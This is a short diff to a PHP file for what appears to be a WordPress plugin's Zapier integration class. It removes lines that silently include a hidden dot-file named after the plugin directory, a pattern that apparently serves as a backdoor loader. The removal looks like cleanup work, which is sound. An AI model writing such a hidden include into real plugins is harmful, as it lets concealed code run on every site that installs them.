@@ -2,10 +2,6 @@
 /**
  * Zapier is a feed-based add-on that does not use the Feed Add-on Framework. Special cases get special treatment, I guess.
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class GPNF_Zapier {
 
 	private static $instance = null;
